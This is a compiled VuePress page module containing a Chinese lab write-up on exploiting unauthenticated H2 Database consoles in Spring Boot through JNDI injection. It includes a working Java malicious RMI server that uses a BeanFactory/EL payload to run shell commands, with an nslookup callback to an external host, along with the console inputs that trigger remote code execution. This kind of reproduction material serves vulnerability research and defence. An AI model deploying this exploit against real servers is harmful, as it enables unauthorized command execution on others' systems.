import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a,b as n,d as t,e as s}from"./app-58e4a7d6.js";const l={},r=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。</p><p>参考链接：</p>`,5),u={href:"https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e",target:"_blank",rel:"noopener noreferrer"},d=s(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>执行如下命令启动一个Springboot + h2database环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动后，访问<code>http://your-ip:8080/h2-console/</code>即可查看到H2 database的管理页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,5),k={href:"https://www.veracode.com/blog/research/exploiting-jndi-injections-java",target:"_blank",rel:"noopener noreferrer"},m=a("code",null,"org.apache.naming.factory.BeanFactory",-1),g=s(`<div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span></span><span class="token punctuation">;</span>
 
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilRMIServerNew</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Creating evil RMI registry on port 1097&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1097</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
        <span class="token comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span>
        <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">&quot;javax.el.ELProcessor&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">&quot;org.apache.naming.factory.BeanFactory&quot;</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//redefine a setter name for the &#39;x&#39; property from &#39;setX&#39; to &#39;eval&#39;, see BeanFactory.getObjectInstance code</span>
        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">&quot;forceString&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;x=eval&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//expression language to execute &#39;nslookup jndi.s.artsploit.com&#39;, modify /bin/sh to cmd.exe if you target windows</span>
        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">&quot;x&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance().getEngineByName(\\&quot;JavaScript\\&quot;).eval(\\&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;/bin/sh&#39;,&#39;-c&#39;,&#39;nslookup jndi.s.artsploit.com&#39;]).start()\\&quot;)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span>ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>
        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">&quot;Object&quot;</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),v={href:"https://github.com/JosephTribbianni/JNDI",target:"_blank",rel:"noopener noreferrer"},b=s(`<p>首先设置JNDI工具中执行的命令为<code>touch /tmp/success</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202232356618.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后启动<code>JNDI-1.0-all.jar</code>，在h2 console页面填入JNDI类名和URL地址：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202240011878.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>Driver Class（JNDI的工厂类）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>javax.naming.InitialContext
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>JDBC URL（运行JNDI工具监听的RMI地址）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>rmi://192.168.128.1:23456/BypassByEL
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>点击连接后，恶意RMI成功接收到请求：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202240012570.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><code>touch /tmp/success</code>已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202240012334.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12);function h(f,x){const e=o("ExternalLinkIcon");return c(),i("div",null,[r,a("ul",null,[a("li",null,[a("a",u,[n("https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e"),t(e)])])]),d,a("p",null,[n("目标环境是Java 8u252，版本较高，因为上下文是Tomcat环境，我们可以参考《"),a("a",k,[n("Exploiting JNDI Injections in Java"),t(e)]),n("》，使用"),m,n("加EL表达式注入的方式来执行任意命令。")]),g,a("p",null,[n("我们可以借助这个小工具"),a("a",v,[n("JNDI"),t(e)]),n("简化我们的复现过程。")]),b])}const w=p(l,[["render",h],["__file","H2 Database Console 未授权访问.html.vue"]]);export{w as default};
